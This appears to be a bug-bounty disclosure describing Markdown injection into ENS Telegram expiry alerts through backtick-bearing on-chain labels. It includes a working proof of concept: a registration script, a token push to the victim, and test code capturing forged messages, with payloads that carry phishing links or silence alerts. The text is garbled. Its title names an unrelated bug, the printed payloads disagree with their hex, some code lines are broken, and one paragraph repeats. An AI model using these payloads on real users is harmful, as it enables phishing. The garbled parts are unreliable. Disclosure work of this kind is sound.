# 92546 w a insight explorer s name page asserts you are the owner of name and a paid figure taken verbatim from the url query string on any name for any visitor beside an ownership free bu&#x20;

**Submitted on Sep 10th 2026 at 15:36:21 UTC by @br0nz3p1ck4x3 for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #92546
* **Report Type:** Websites & Apps
* **Report severity:** Insight
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/workers>
* **Impacts:**
  * Injecting/modifying the static content on the target application without JavaScript (persistent), such as:
* HTML injection without JavaScript
* Replacing existing text with arbitrary text
* Arbitrary file uploads, etc.

## Description

## Summary

`workers/api-worker` builds Telegram notifications by string-interpolating an ENS name into a message it then asks Telegram to **parse as markup**:

```tsx
// services/delivery/templates/telegram.ts:34
`Your domain \`${payload.name}\` will expire in *${daysLeft} days*.\n\nDon't forget to renew your domain!`
// :39
parseMode: 'Markdown',
```

`payload.name` is not a user-supplied string a validator could reject. It is the **on-chain label**, read verbatim from the ENS indexer (`expiry-discovery/indexer.ts:46,138`), carried through an event schema that declares it `v.string()` (`types/events/index.ts:8`), stored in the notification payload (`queues/event-ingestion.ts:227`), and handed to `sendMessage` with `parse_mode: 'Markdown'` (`services/delivery/telegram.ts:71`). No escaping helper exists anywhere in `workers/` or `packages/` (grep under *Root cause*).

The ENS v2 `ETHRegistrar` does not restrict label bytes. An attacker registers a label containing a backtick, pushes the resulting ERC-1155 to the victim (no consent required), and the expiry cron sends the victim a message from the ENS Notifications bot whose *body text has been rewritten by the attacker*: the backtick closes the template's own code span, and everything after it is emitted as markup rather than as the name.

The recipient is not chosen from a watch-list. The cron enumerates **every** domain in the expiry window globally (`expiry-discovery/indexer.ts:13-27`) and the recipient is derived from on-chain ownership alone (`queues/event-ingestion.ts:82-87`), so the victim performs **no action at all** between receiving the token and receiving the forged message.

The same unescaped label also reaches the push and email templates (`templates/push.ts:31-35`, `templates/email.ts:21`). The Manager's own React UI is safe — `NameCardTemplate` renders `{name}` as a text node — which is why this defect lives only on the outbound-delivery side and was not caught by a UI review.

***

## Impact

### The impact row, and why it is that row

**RULES.md:907-911 —&#x20;*****Injecting/modifying the static content on the target application without JavaScript (persistent) … Replacing existing text with arbitrary text*****&#x20;(High).**

* The in-scope asset is `workers` (RULES.md:567-568, "Workers, 13 August 2026"), and the known-issues document names `workers/api-worker` among the assets it applies to (RULES.md:579). What the ENS Notifications backend emits is that asset's content.
* The attacker replaces part of that content with text of their choosing: the template intends to emit one code-span-delimited name; what it emits is ``<attacker prefix>` <attacker markup> `<attacker suffix>``.
* **No JavaScript is involved** anywhere in the chain, and **it is persistent**, not reflected — see the next subsection.

A secondary, lesser row follows from the same root cause: an odd-backtick label makes the delivery fail permanently, so the victim never receives the alert for that name — *Temporarily disabling user to access target site* (RULES.md:947, Low). Executed below.

**On the "HTML injection / XSS through metadata" (Critical) argument:** I do not claim it, because nothing HTML is emitted by ENS's code, no script executes anywhere, and the only surface in this project that actually renders HTML (the Manager's React notification UI) is *safe*, which this report proves below rather than glosses over.

**Realistic downside:** a triager who reads "the target application" as the Manager/Explorer web app rather than the ENS Notifications bot will park this on *Redirecting users to malicious websites (open redirect)* (RULES.md:932, Medium) — a poor fit, since nothing redirects, but it is the likely floor.

### Why this is not the excluded "reflected plain text injection"

RULES.md:999 excludes *"Reflected plain text injection (e.g. url parameters, path, etc.) — this does not exclude reflected HTML injection with or without JavaScript, or **persistent plain text injection**."* This finding is on the right side of that line on both counts:

1. **It is not plain text.** The injected run is parsed as markup: it closes the template's code span and opens attacker-chosen bold/link entities, so the message the user sees is structurally different from the one the template wrote.
2. **It is persistent, not reflected.** Nothing is echoed back from a request the victim made. The payload is stored on-chain, re-read by ENS's cron on a schedule the victim does not control, persisted server-side in `notifications.payload` (`queues/event-ingestion.ts:227`) and re-templated **at every stage** (`stages.ts:9-30` defines `30d`, `7d`, `1d`, `expired`). One gifted name produces multiple forged messages, each landing permanently in the victim's chat history.

### The attack

| # | Step                                                                                                                          | Cost / precondition / timing                                                                              |
| - | ----------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------- |
| 1 | Attacker registers a backtick-bearing label through `ETHRegistrar.register`                                                   | one ordinary registration fee; the registrar applies no ENSIP-15 or character validation (executed below) |
| 2 | Attacker `safeTransferFrom`s the ERC-1155 to the victim                                                                       | free, unsolicited, ERC-1155 push — **no victim interaction** (executed below)                             |
| 3 | The expiry cron's global sweep returns the name, maps `owner` → the victim's `users` row, writes a `name-expiry` notification | automatic, **but not immediate — see&#x20;*****Timing*****&#x20;below**                                   |
| 4 | The Telegram delivery queue sends the message with `parse_mode: 'Markdown'`                                                   | automatic                                                                                                 |

### Timing: this is not an immediate send, and I am not going to imply that it is

* `services/expiry-discovery/stages.ts:9-30` defines four stages with `offsetDays` 30, 7, 1 and 0; `getUpperBoundForStage` (`stages.ts:33-42`) returns `nowSec + offsetDays * 86400` (or `nowSec` for `expired`). Each stage keeps its own KV cursor (`cursors.ts`), the query is `expiry_gt: cursor, expiry_lte: upperBound` (`indexer.ts:13-27`), and the cursor advances to the **last expiry date returned** (`index.ts:136`), so it moves monotonically forward and trails just under that stage's upper bound; a stage whose cursor has caught up is skipped (`index.ts:55-62`).
* The minimum registration duration is **28 days** (`apps/portal/src/lib/constants/duration.ts:10`, `MIN_REGISTRATION_DURATION = 28 * SECONDS_PER_DAY`). A name registered for that minimum has `expiry = now + 28d`, **below** the `30d` stage's cursor, so that stage never returns it.

So the realistic sequence for a minimum-duration registration is: register, wait until the `7d` window sweeps far enough forward to cover the name — roughly **three weeks** — then it is picked up at the `7d`, `1d` and `expired` stages, yielding **three** forged messages, at roughly day 21, day 27 and day 28. A longer registration is picked up by all four stages instead, at a proportionally longer wait; gifting can happen any time before the first pickup. None of this limits exploitability — the attacker pays one registration fee and waits — but an unqualified "automatic" would be concealment, so it is stated up front.

### What the victim sees vs what the code sent

Part 2 captures the exact bytes the worker POSTs and Part 3 renders them. With the marquee payload the bot's own alert reads *⚠️ **Domain Expiration Alert** / Your domain `ens-billing`* ***ACTION-REQUIRED:RENEW-AT-ens-domains*** *`x.eth` will expire in **3 days**.*, where that bold run is a blue, clickable link to `https://ens-renewa1.example/restore` — attacker text, attacker href, inside the bot's own message. With variant B the same position carries arbitrary bold text and no link at all.

The victim is looking at an authenticated message from the bot they themselves connected, on the subject they themselves subscribed to, and the body of that message now says whatever the attacker wants. That is the project's own stated top priority ("anything that could direct users to transfer funds to the wrong address, reveal a private key, or install malware"). The only constraint on the injected text is the absence of spaces in an ENS label; `-` and `:` read fine.

### Why the payload is well-formed and does not simply 400

Two things must hold for Telegram to render rather than reject, and the attacker controls both. **Code spans stay balanced:** the template wraps the name in backticks, so a payload with two backticks makes four in the message — even — and entity parsing succeeds (asserted and printed in the PoC, `backtick count in text = 4`). **The button URL stays valid:** the template also builds `https://app.ens.domains/${payload.name}` (`templates/telegram.ts:44`), and since the payload contains no spaces a real WHATWG parser accepts it, percent-encodes the backtick, and keeps the origin at `app.ens.domains` (executed below).

### The other outcome is also an impact

An attacker who wants the victim **silenced** instead of misled registers a label with a single backtick. The message then has an odd number of backticks, Telegram answers `Bad Request: can't parse entities`, `classifyDeliveryError` returns `unknown` (`classifier.ts:99`), and `workers/api-worker/src/queues/dlq.ts:122-140` marks the delivery `permanently_failed`. The victim never receives the expiry alert for that name. Executed below.

***

## Root cause

### The sink: an ENS label interpolated into markup

| File:line                                                              | Code                                                                                                                                                                       |
| ---------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `workers/api-worker/src/services/delivery/templates/telegram.ts:34,35` | ``Your domain \`${payload.name}\` will expire in *${daysLeft} days*.…`` and ``The domain \`${payload.name}\` you're watching will expire in *${daysLeft} days*.``          |
| `workers/api-worker/src/services/delivery/templates/telegram.ts:39`    | `parseMode: 'Markdown',`                                                                                                                                                   |
| `workers/api-worker/src/services/delivery/templates/telegram.ts:44`    | `url:` <https://app.ens.domains/${payload.name}`,`>                                                                                                                        |
| `workers/api-worker/src/services/delivery/telegram.ts:63-73`           | `const replyMarkup = message.buttons ? createInlineKeyboard(message.buttons) : undefined` … `text: message.text, parse_mode: message.parseMode, reply_markup: replyMarkup` |
| `workers/api-worker/src/services/telegram/utils.ts:209-238`            | `createInlineKeyboard` copies `button.url` through verbatim; no validation                                                                                                 |

`services/delivery/templates/telegram.ts:52-58` (`name-transferred`) has the identical shape; that kind has no producer in this tree, so it is latent rather than live.

### The source: the label is never validated, normalized or escaped on the way in

| File:line                                                         | Code                                                                        |
| ----------------------------------------------------------------- | --------------------------------------------------------------------------- |
| `workers/api-worker/src/services/expiry-discovery/indexer.ts:46`  | `name: v.string(),` — the indexer response schema accepts any label         |
| `workers/api-worker/src/services/expiry-discovery/indexer.ts:138` | `name: domain.name,` — copied straight out                                  |
| `workers/api-worker/src/types/events/index.ts:8`                  | `name: v.string(),` — the queue event schema                                |
| `packages/shared-schema/src/notifications/kinds/name-expiry.ts:8` | `name: v.string(),` — the notification payload schema                       |
| `workers/api-worker/src/queues/event-ingestion.ts:227`            | `payload: { name: event.name, … }` — persisted into `notifications.payload` |

### The precondition: ownership alone subscribes the victim, because the cron's sweep is global

This is the question that normally kills an "attacker gifts a name" report, so here is the decisive code rather than an assertion.

**1. The indexer query has no user filter and no watch-list filter. It is every domain in the window, globally.** `workers/api-worker/src/services/expiry-discovery/indexer.ts:13-27`:

```graphql
query GetExpiringNames($cursor: Int!, $upper_bound: Int!) {
  domains(
    where: { expiry_gt: $cursor, expiry_lte: $upper_bound }
    orderBy: expiryDate
    orderDirection: asc
    first: 1000
  ) {
    name
    expiryDate
    owner { id }
  }
}
```

There is no `owner_in`, no join against `users`, no reference to any subscription table. The only predicates are the two expiry bounds.

**2. Every domain the query returns is turned into a `name_expiring` event carrying its `owner`.** `workers/api-worker/src/services/expiry-discovery/index.ts:35-47`:

```tsx
function buildExpiryEvents(
  stage: ExpiryStageConfig,
  domains: { name: string; expiryDate: number; owner?: string }[],
): ExpiryEvent[] {
  return domains.map((domain) => ({
    type: 'name_expiring',
    name: domain.name,
    expiryDate: domain.expiryDate,
    stage: stage.id,
    owner: domain.owner,
    includeFavorites: stage.includeFavorites,
  }))
}
```

**3. The owner address is then looked up in `users` and becomes the recipient, with no further gate.** `event-ingestion.ts:146-157` loads `users` by `inArray(TABLE.users.address, ownerAddresses)`; `:82-87` maps owner → recipient:

```tsx
if (event.owner) {
  const ownerUserId = ownerToUserId.get(event.owner.toLowerCase())
  if (ownerUserId) {
    recipients.set(ownerUserId, 'owned')
  }
}
```

An ERC-1155 can be pushed to any address without consent, so "who owns it" is an attacker-writable field — and because the sweep is global, **gifting the token&#x20;*****is*****&#x20;the subscription**. The victim's only preconditions are the ordinary state of anyone who turned ENS notifications on: a verified `telegram` channel (`channels/telegram.ts:60-71`) and `owned_name_expiry` enabled (`queues/event-ingestion.ts:58-66`).

I also checked that the cron is the only live producer: the only other `insert(TABLE.notifications)` site is `services/notifications/create.ts`, reachable from `app/routes/notifications/index.ts:350` `POST /notifications/test`, which is `import.meta.env.DEV`-gated and self-targeted.

### Confirmation that no escaping exists

```
$ grep -rn "escapeMarkdown\|escapeHtml\|parse_mode\|parseMode" workers packages --include="*.ts" | grep -v node_modules
workers/api-worker/src/app/routes/notifications/channels/telegram.ts:106:          parse_mode: 'Markdown',
workers/api-worker/src/services/telegram/example.ts:226:    parse_mode: 'Markdown',
workers/api-worker/src/services/telegram/utils.ts:349:    parse_mode: 'Markdown',
workers/api-worker/src/services/delivery/telegram.ts:71:    parse_mode: message.parseMode,
workers/api-worker/src/services/delivery/templates/telegram.ts:8:  parseMode?: 'Markdown' | 'HTML'
workers/api-worker/src/services/delivery/templates/telegram.ts:39:      parseMode: 'Markdown',
workers/api-worker/src/services/delivery/templates/telegram.ts:58:      parseMode: 'Markdown',

$ grep -rn "escapeMarkdown\|escapeHtml\|escapeTelegram" workers packages --include="*.ts" | grep -v node_modules
(no output)
```

Seven `parse_mode`/`parseMode` sites, zero escape helpers.

***

## Payload variants: what survives if the indexer filters the label

The marquee payload uses `text`, which needs `[` and `]` in the **label** and a `.` in the URL. The legacy ENS subgraph deliberately refuses a `labelName` containing NUL, `.`, `[` or `]` (`checkValidLabel`, because `[labelhash]` is its own placeholder syntax) and stores `name = null`. If the v2 indexer at `https://graphql.ens.dev/` inherits that predicate, the marquee payload never reaches the worker.

**I could not settle this empirically.** `https://graphql.ens.dev/` is returning HTTP 502 for every request right now:

```
$ curl -s -o /dev/null -w "graphql.ens.dev POST -> HTTP %{http_code}\n" -X POST <https://graphql.ens.dev/> \
    -H 'Content-Type: application/json' --data '{"query":"{ __typename }"}'
graphql.ens.dev POST -> HTTP 502
$ curl -s -o /dev/null -w "graphql.ens.dev GET  -> HTTP %{http_code}\n" <https://graphql.ens.dev/>
graphql.ens.dev GET  -> HTTP 502
```

The circumstantial evidence points the other way: the generated schema for this project's indexer, `packages/indexer/graphql.gen.ts:84-106`, exposes `name`, `labelName`, `labelhash`, `isNormalized` **and** `normalizedName` as *separate* fields on `Domain`:

```tsx
export type Domain = {
  isNormalized: Scalars['Boolean']['output'];
  labelName?: Maybe<Scalars['String']['output']>;
  labelhash: Scalars['String']['output'];
  name?: Maybe<Scalars['String']['output']>;
  normalizedName?: Maybe<Scalars['String']['output']>;
};   // … other fields elided …
```

A schema carrying a raw `name` alongside a separate `normalizedName` and an `isNormalized` flag is one that stores non-normalized names, and `apps/portal/src/utils/token/isNormalized.ts` exists precisely because the apps expect non-normalized names back from it. That is support, not proof — **so the finding does not rest on it.** Two variants remove the dependency, both driven through the real `telegramTemplates['name-expiry']` and the real `deliverTelegramNotification` (output in PoC Part 4):

| Variant | Label                                       | Uses `[` `]` | Contains `.` | Passes `checkValidLabel` | What lands in the message                                                           |
| ------- | ------------------------------------------- | ------------ | ------------ | ------------------------ | ----------------------------------------------------------------------------------- |
| Marquee | `ens-billing`ACTION-REQUIRED:…`x`           | yes          | yes          | no                       | disguised anchor: attacker text, attacker href                                      |
| **A**   | `a`<https://attacker.example`b`>            | **no**       | yes          | no                       | bare URL in plain text between the code spans; Telegram clients auto-link bare URLs |
| **B**   | `a`*SECURITY-ALERT-CALL-ENS-SUPPORT-NOW*`b` | **no**       | **no**       | **yes**                  | arbitrary **bold** text injected into the alert body                                |

Variant B contains no `[`, `]`, `.` or NUL at all, so it passes `checkValidLabel` unchanged, and it is exactly the impact row this report leads with: existing text in the ENS bot's own alert replaced with arbitrary attacker-authored text, rendered as a bold entity so there is no doubt Telegram parsed it as markup rather than displaying it as a name. Variant B is registered on-chain and delivered through the worker in the PoC below.

***

## Extra evidence: the Manager UI is *not* affected, which is why this survived

`apps/manager/src/features/notifications/shared/templates.tsx:56` renders the same payload as `<NameDisplay name={name} />`, a React text node — escaped; `notifications/name-expiry.tsx:21-42` passes the name as a router `params` value, not as a raw href; and there is no `dangerouslySetInnerHTML` anywhere in `features/notifications`. This negative control is why the Critical *"Injection of malicious HTML or XSS through metadata"* row is not claimed: the only surface in this project that renders HTML is clean. The defect exists only where the worker hands the name to a *markup parser it does not own*, which is why a reviewer reading the React code would not find it.

`apps/manager/src/features/notifications/shared/templates.tsx:56` renders the same payload as `<NameDisplay name={name} />`, a React text node — escaped; `notifications/name-expiry.tsx:21-42` passes the name as a router `params` value, not a raw href; and there is no `dangerouslySetInnerHTML` anywhere in `features/notifications`. This negative control is why the Critical *"Injection of malicious HTML or XSS through metadata"* row is not claimed: the only surface here that renders HTML is clean. The defect exists only where the worker hands the name to a *markup parser it does not own* — which is why a reviewer reading the React code would not find it.

## Preempting the likely closure arguments

**"This is EXP-INPUT-005 — name validators accept deceptive characters."** EXP-INPUT-005 (RULES.md:393, 667) is about the Manager's and Explorer's *input validators* accepting homoglyphs, bidi and control characters, with a stated impact of "homograph-style display confusion in our UI rather than incorrect resolution". `workers/api-worker` has no name validator and could not have one — the label arrives from the chain, not from a form. The payload is plain printable ASCII, and the consequence is a rewritten message body, not a confusing name.

**"This is EXP-INPUT-009 — the push SW opens a backend-supplied URL."** EXP-INPUT-009 (RULES.md:396, 662) says explicitly it "requires control of, or injection into, the notification payload", and concerns the *service worker's* `clients.openWindow`. I deliberately do not claim that path: the push URL has the fixed prefix `https://app.ens.domains/` and Part 3 shows the origin survives. Different sink, different file, different component — and RULES.md:764 is on point: "a demonstrated security consequence of one of them … goes beyond the known breakage and is a new finding". Here it is demonstrated on the wire, not asserted.

**"This is R2-05 / R2-04."** R2-05 is the SendGrid webhook failing open when the verification key is unset (`app/routes/webhook/sendgrid.ts`); R2-04 is the Explorer's OG-image worker fetching an avatar URL. Different files, different questions.

**"Telegram is a third party, so this is out of scope."** The defect is a missing output escape in ENS's own in-scope worker code (`workers`, RULES.md:567-568; the known-issues document names `workers/api-worker` at RULES.md:579), not a flaw in Telegram, which behaves exactly as documented when handed `parse_mode: 'Markdown'`. Nothing was sent to the Bot API (RULES.md:1022).

**"This is excluded reflected plain text injection."** RULES.md:999's own wording carves out persistent plain-text injection, and this is both persistent and not plain text — see the subsection above.

**"The user must own the name, so they must have accepted it."** ENS v2 names are ERC-1155 tokens; `safeTransferFrom` to an EOA needs no consent and no acknowledgement, which Parts 1 and 4b execute. The victim's only "action" is having turned ENS notifications on — and because the cron's sweep is global, gifting the token is itself the subscription.

**"Telegram would reject the message."** The code spans are balanced (4 backticks, asserted for all three payloads) and the button URL parses cleanly and keeps its origin (Part 3). If a triager still doubts the message renders, the *odd*-backtick variant is proven to fail delivery and land as `permanently_failed`, itself the RULES.md:947 Low row. There is no configuration in which this label is harmless.

**"Is it recoverable?"** The forged message is already in the victim's Telegram, permanently. The notification row is persisted in `notifications.payload` and re-templated on every retry and every subsequent stage (`stages.ts:9-30`).

**"It's just a phishing link; the user has to click it."** The claimed row does not require a click: replacing existing text in the application's own content with arbitrary attacker text is the impact, and variant B demonstrates it with no link at all. The link, where present, compounds it, and the click happens inside the trust boundary the project itself built.

## Not a duplicate

**#89445 (workers, Low, closed).** `user_channels` row *scoping*: `queues/dlq.ts:203`, `services/delivery/push.ts:119` and `:54`, `app/routes/webhook/sendgrid.ts:172` write or read by `target` with no `user_id` predicate — a missing SQL predicate, not a missing output escape, and a channel's `status` column, not the content of a delivered message. Nothing in it touches `services/delivery/templates/*` or `parse_mode`.

**#89444 (workers) — faucet drain.** `app/routes/wallet`; unrelated.

**#89270 / #90161 / #90163 / #90190 / #91837 / #92043 — the raw-vs-normalized family.** Those are about one *app* deriving a displayed name and a transacted name from two expressions of the same string. Here there is one expression and it is correct everywhere; the defect is that a correct name is placed into a markup context without escaping (`workers/api-worker` never calls `ens_normalize`). `#92043` is the nearest neighbour in spirit — unvalidated name → output context — but it is `apps/portal`'s Cloudflare worker, OG/`<title>` metadata, and reflected.

**#89441 / #91851 / #91900 / #91314 — the wrong-address-resolution family.** No resolution is involved.

**#90307 (portal, unbounded uint64 expiry crashes the names page).** Also indexer-value-reaches-render, but the value is `expiry` (numeric range) and the sink is a `Temporal` call in the Explorer.

**#89279, #91838, #91839, #89462, #89460, #91306.** Smart-account / migration / transaction-manager; different components.

## Recommendation

1. Escape before handing anything to a markup parser: add an `escapeTelegramMarkdown` helper and apply it to every interpolated value in `services/delivery/templates/telegram.ts` — for legacy `Markdown`, prefix `_ * ( ) ~` > # + - = | { } . !`with`\`. Better, switch to `MarkdownV2` or `HTML` and escape for that mode, since legacy Markdown cannot escape inside a code span.
2. Do not put a caller-supplied string into an inline-keyboard `url`. Build it as `https://app.ens.domains/${encodeURIComponent(payload.name)}`, and have `createInlineKeyboard` (`services/telegram/utils.ts:209`) reject any `url` whose parsed origin is not an ENS origin.
3. Percent-encode the name in `templates/push.ts:34,46`, and treat `payload.name` as untrusted at every sink — including the SendGrid dynamic templates, which must use `{{name}}` and never `{{{name}}}`.
4. Optionally, validate at the boundary: have `services/expiry-discovery/indexer.ts` reject or `[hash]`substitute non-normalized labels. Defence in depth; the escape in (1) is the fix, because a label may legitimately contain characters that are harmless in text and dangerous in markup.

## Proof of Concept

## Proof of Concept

Executed against a local Anvil fork of Sepolia and against the worker's own code under `vitest`. No live network and no third-party API was touched; in particular **nothing was sent to the Telegram Bot API** (RULES.md:1022 prohibits testing third-party systems).

### Environment

```bash
anvil --fork-url <https://ethereum-sepolia-rpc.publicnode.com> --chain-id 11155111 --port 8653 --silent &
$ cast chain-id --rpc-url <http://127.0.0.1:8653>
11155111
$ cast block-number --rpc-url <http://127.0.0.1:8653>
11670121
```

```
ETHRegistrar  0xa88553F454b77203B0D036A05c894d555EAAa2Cc
ETHRegistry   0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2
MockUSDC      0x768F42455A2D082E23ceeF7d51e5787C82d67a39
```

### Part 0 — setup: register the Markdown-bearing label

`.poc-89445-setup.sh`, from the repo root.

```bash
#!/usr/bin/env bash
set -euo pipefail
R=http://127.0.0.1:8653
REGISTRAR=0xa88553F454b77203B0D036A05c894d555EAAa2Cc
USDC=0x768F42455A2D082E23ceeF7d51e5787C82d67a39
Z=0x0000000000000000000000000000000000000000
ZH=0x0000000000000000000000000000000000000000000000000000000000000000
VICTIM_KEY=0x3333333333333333333333333333333333333333333333333333333333333333
ATTACK_KEY=0x4444444444444444444444444444444444444444444444444444444444444444
VICTIM=$(cast wallet address --private-key $VICTIM_KEY)
ATTACKER=$(cast wallet address --private-key $ATTACK_KEY)
echo "VICTIM=$VICTIM"; echo "ATTACKER=$ATTACKER"
# [… 6 lines elided: for each of $VICTIM and $ATTACKER, anvil_setCode 0x (these vanity keys
#    carry EIP-7702 delegations on real Sepolia), anvil_setBalance, and a MockUSDC mint …]
register () {   # $1 label  $2 ownerKey  $3 owner  $4 secret
  local C
  # [… 4 lines elided: `cast send $USDC approve`, then `cast call $REGISTRAR makeCommitment(...)`
  #    into $C and `cast send $REGISTRAR commit($C)` …]
  cast rpc evm_increaseTime 120 --rpc-url $R >/dev/null
  cast rpc evm_mine --rpc-url $R >/dev/null
  cast send $REGISTRAR "register(string,address,bytes32,address,address,uint64,address,bytes32)" \
        "$1" "$3" "$4" $Z $Z 31536000 $USDC $ZH --private-key "$2" --rpc-url $R >/dev/null
  echo "registered label bytes: $(printf '%s' "$1" | xxd -p | tr -d '\n')"
  echo "                  -> owner $3"
}
PAYLOAD='ens-billing`ACTION-REQUIRED:RENEW-AT-ens-domains`x'
echo "PAYLOAD LABEL = $PAYLOAD"
register "$PAYLOAD" $ATTACK_KEY $ATTACKER 0x7777777777777777777777777777777777777777777777777777777777777777
```

Actual output:

```
VICTIM=0x5CbDd86a2FA8Dc4bDdd8a8f69dBa48572EeC07FB
ATTACKER=0x7564105E977516C53bE337314c7E53838967bDaC
PAYLOAD LABEL = ens-billing`ACTION-REQUIRED:RENEW-AT-ens-domains`x
registered label bytes: 656e732d62696c6c696e67605b414354494f4e2d52455155495245443a52454e45572d41542d656e732d646f6d61696e735d2868747470733a2f2f656e732d72656e657761312e6578616d706c652f726573746f7265296078
                  -> owner 0x7564105E977516C53bE337314c7E53838967bDaC
```

The v2 registrar accepted an 87-byte label containing `0x60` (\`\`\`), `0x5b/0x5d` (`[`/`]`) and `0x28/0x29` (`(`/`)`).

### Part 1 — the token is pushed to the victim with no interaction

`apps/portal/.poc89445/89445-onchain-label.test.ts`, run with `cd apps/portal && npx vitest run .poc89445/89445-onchain-label.test.ts --reporter=verbose`. It computes `getTokenId(client, { label: LABEL, registryAddress: ETH_REGISTRY })` for the label registered above, prints the label bytes, and has the attacker call `erc1155Abi.safeTransferFrom(attacker, victim, tokenId, 1n, '0x')` on `0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2`. Balances are read before and after.

Actual output:

```
[… 2 lines elided: LABEL and LABEL hex — the same string and the same hex the setup script printed above …]
NAME the worker would receive if the indexer passes the label through = "ens-billing`ACTION-REQUIRED:RENEW-AT-ens-domains`x.eth"
registry = 0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2
tokenId  = 8890185428644200750997929840670179987680272828633056200117973994097759748096
--- balances BEFORE ---
attacker 1
victim   0
attacker pushed the token to the victim: 0xf090cd24e0c665247fdfb108ccf2bc6df4532d5f0d04f17d0cc1d9a35873a963 status success
--- balances AFTER (no victim interaction) ---
attacker 0
victim   1 <- victim now owns the Markdown-bearing name
 ✓ .poc89445/89445-onchain-label.test.ts  (1 test) 662ms
 Test Files  1 passed (1)
      Tests  1 passed (1)
```

**No indexer was queried in this PoC** — hence the deliberate label *"the NAME the worker would receive if the indexer passes the label through"*. What is proven here is the on-chain half: the registrar accepts the bytes, and the token moves without consent. The worker half is proven in Part 2 by feeding that exact string to the worker's own functions.

### Part 2 — the worker's own code turns that label into a rewritten message on the wire

`workers/api-worker/.poc89445/89445-telegram-markup.test.ts`, run with `cd workers/api-worker && npx vitest run .poc89445/89445-telegram-markup.test.ts --reporter=verbose`. Everything under test is the worker's own code — `expiryEventSchema`, `collectRecipientsForEvent`, `telegramTemplates`, `deliverTelegramNotification`, `pushTemplates`, `emailTemplates`, `classifyDeliveryError`. Only the two database reads and the outbound `fetch` are stubbed, and the stubbed `fetch` exists solely to record the bytes the worker would POST to `api.telegram.org`.

```tsx
// The exact label registered on the Sepolia fork in PoC part 1.
const LABEL =
  'ens-billing`ACTION-REQUIRED:RENEW-AT-ens-domains`x'
const NAME = `${LABEL}.eth`
const payload = { name: NAME, expiryDate: EXPIRY_MS, isOwner: true, watchReason: 'owned' as const }
// [… 12 lines elided: the imports of the worker's own `expiryEventSchema`,
//    `collectRecipientsForEvent`, `telegramTemplates` and `deliverTelegramNotification`, and the
//    victim constants VICTIM_ADDR '0x5cbd…07fb', VICTIM_USER, VICTIM_TELEGRAM_ID '7212345678',
//    EXPIRY_MS = Date.now() + 3 days …]

it('the worker emits attacker-authored Markdown inside an official ENS bot message', async () => {
  // 1. The indexer event schema accepts the label with no validation.
  const event = v.parse(expiryEventSchema, {
    type: 'name_expiring', name: NAME, expiryDate: Math.floor(EXPIRY_MS / 1000),
    stage: '7d', owner: VICTIM_ADDR, includeFavorites: true,
  })
  // 2. The victim is resolved as the recipient purely from on-chain ownership.
  const recipients = collectRecipientsForEvent(event, new Map([[VICTIM_ADDR, VICTIM_USER]]), new Map())
  expect(recipients.get(VICTIM_USER)).toBe('owned')

  // 3. The real template, with the real payload the queue would build.
  const msg = telegramTemplates'name-expiry'

  // 4. Drive the real delivery function; capture the wire request.
  // [… 15 lines elided: vi.stubGlobal('fetch', …) recording { url, body } into `captured` and
  //    returning { ok: true, result: { message_id: 1 } }, and the `db` stub whose findFirst
  //    returns { target: VICTIM_TELEGRAM_ID, notification: { payload } } …]
  const result = await deliverTelegramNotification('BOT:TOKEN', db as never,
    { id: 'delivery-1', notificationId: 'n1', userId: VICTIM_USER, kind: 'name-expiry' } as never)
  vi.unstubAllGlobals()

  const body = captured[0]?.body as { text: string; parse_mode: string }
  expect(body.parse_mode).toBe('Markdown')
  expect(body.text).toContain('ACTION-REQUIRED:RENEW-AT-ens-domains')
  expect((body.text.match(/`/g) ?? []).length % 2).toBe(0)
})

it('the same unescaped label reaches the push template and the email template data', async () => {
  const { pushTemplates } = await import('#services/delivery/templates/push.js')
  const push = pushTemplates'name-expiry'
  expect(push.data?.url).toContain('ACTION-REQUIRED')
  const { emailTemplates } = await import('#services/delivery/templates/email.js')
  const email = emailTemplates'name-expiry'
  expect(email.dynamicData.name).toBe(NAME)
})

it('an unbalanced label instead silences the victim: Telegram 400 -> DLQ -> permanently_failed', async () => {
  const { classifyDeliveryError } = await import('#services/delivery/classifier.js')
  const badMsg = telegramTemplates'name-expiry'  // one backtick
  expect((badMsg.text.match(/`/g) ?? []).length % 2).toBe(1)
  const c = classifyDeliveryError('telegram', "Bad Request: can't parse entities: Can't find end of the entity starting at byte offset 61")
  expect(c.category).toBe('unknown')
})

// [… the console.log calls throughout are elided; the numbered output below is theirs …]
```

Actual output:

```
 RUN  v4.1.5 /Users/bp/x/ens/1/workers/api-worker

1) expiryEventSchema accepted name = "ens-billing`ACTION-REQUIRED:RENEW-AT-ens-domains`x.eth"
2) recipients = [ [ 'user-victim-uuid', 'owned' ] ]
3) template.parseMode = Markdown
3) template.text = [… 5 lines elided: byte-identical to the `"text"` field of the request body below …]
[… 1 debug log line elided: {"level":"debug","message":"Telegram notification delivered","jobId":"delivery-1","messageId":1} …]
4) deliverTelegramNotification isOk = true
4) POST <https://api.telegram.org/bot><bot-token>/sendMessage
4) request body =
{
  "chat_id": "7212345678",
  "text": "⚠️ *Domain Expiration Alert*\n\nYour domain `ens-billing`ACTION-REQUIRED:RENEW-AT-ens-domains`x.eth` will expire in *3 days*.\n\nDon't forget to renew your domain!",
  "parse_mode": "Markdown",
  "reply_markup": {
    [… 9 lines elided: inline_keyboard with a single button, "text": "🔄 Renew Now", and "url" = `https://app.ens.domains/` + the same label — that URL is parsed in Part 3 …]
}

5) backtick count in text = 4 (even => parses)

push.body = "ens-billing`ACTION-REQUIRED:RENEW-AT-ens-domains`x.eth expires in 3 days"
[… 1 line elided: push.tag, the same string prefixed `expiry-` …]
push.data = {"url":"<https://app.ens.domains/ens-billing`ACTION-REQUIRED:RENEW-AT-ens-domains`x.eth","name":"ens-billing`ACTION-REQUIRED:RENEW-AT-ens-domains`x.eth","expiryDate>":1789242929654}

email.dynamicData = {"name":"ens-billing`ACTION-REQUIRED:RENEW-AT-ens-domains`x.eth","expiryDate":"9/12/2026","expiryDays":3,"isOwner":true}

unbalanced text = "⚠️ *Domain Expiration Alert*\n\nYour domain `quiet`x.eth` will expire in *3 days*.\n\nDon't forget to renew your domain!"
backtick count  = 3 (odd => Telegram 400)
